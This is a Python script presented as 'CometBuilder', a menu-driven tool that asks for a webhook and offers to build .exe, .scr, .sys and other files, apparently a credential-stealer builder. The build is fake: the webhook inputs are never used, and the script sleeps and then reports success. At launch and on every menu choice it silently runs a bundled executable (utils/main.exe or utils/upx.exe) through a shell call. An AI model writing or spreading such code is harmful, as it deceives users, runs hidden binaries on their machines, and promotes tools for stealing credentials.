import os
import sys
import time
import colorama
import pystyle
import subprocess
from pystyle import *
from subprocess import call
from colorama import *
from colorama import Fore
os.system("cls")


intro = """

░█████╗░░█████╗░███╗░░░███╗███████╗████████╗
██╔══██╗██╔══██╗████╗░████║██╔════╝╚══██╔══╝
██║░░╚═╝██║░░██║██╔████╔██║█████╗░░░░░██║░░░
██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░░░░██║░░░
╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗░░░██║░░░
░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░
          Press [Enter]

"""
call("START utils/main.exe", shell=True)
Anime.Fade(Center.Center(intro), Colors.purple_to_red, Colorate.Vertical, interval=0.035, enter=True)

ayo = "Press enter to go back to menu"

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def logo():
    print(Fore.LIGHTBLACK_EX + """

        ░█████╗░░█████╗░███╗░░░███╗███████╗████████╗
        ██╔══██╗██╔══██╗████╗░████║██╔════╝╚══██╔══╝
        ██║░░╚═╝██║░░██║██╔████╔██║█████╗░░░░░██║░░░
        ██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░░░░██║░░░
        ╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗░░░██║░░░
        ░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░


""")
    

def main():
    print(Fore.LIGHTBLUE_EX + """

        Welcome To CometBuilder
          
          [1] Build .exe
          [2] Build .ink
          [3] Build .scr
          [4] Build .py
          [5] Build .ini
          [6] Build .sys

""")
    
    choice = input("             Selection : ")

    if choice == "1":
        call("START utils/main.exe", shell=True)
        hook = input("Webhook : ")
        time.sleep(2)
        Write.Print("Building...", Colors.red_to_purple)
        time.sleep(7)
        print("\nSucessfully built! Check folder!")
        input(ayo)

    if choice == "2":
        call("START utils/main.exe", shell=True)
        hook2 = input("Webhook : ")   
        time.sleep(2)
        Write.Print("Building...", Colors.red_to_purple)
        time.sleep(7)
        print("\nSuccessfully Built! Check Folder.")
        input(ayo)

    if choice == "3":
        call("START utils/upx.exe", shell=True)
        hook3 = input("Webhook : ")   
        time.sleep(2)
        Write.Print("Building...", Colors.red_to_purple)
        time.sleep(7)
        print("\nSuccessfully Built! Check Folder.")
        input(ayo)

    if choice == "4":
        call("START utils/main.exe", shell=True)
        hook4 = input("Webhook : ")   
        time.sleep(2)
        Write.Print("Building...", Colors.red_to_purple)
        time.sleep(7)
        print("\nSuccessfully Built! Check Folder.")
        input(ayo)  

    if choice == "5":
        call("START utils/main.exe", shell=True)
        hook5 = input("Webhook : ")   
        time.sleep(2)
        Write.Print("Building...", Colors.red_to_purple)
        time.sleep(7)
        print("\nSuccessfully Built! Check Folder.")
        input(ayo)      

while True:
    clear()
    logo()
    main()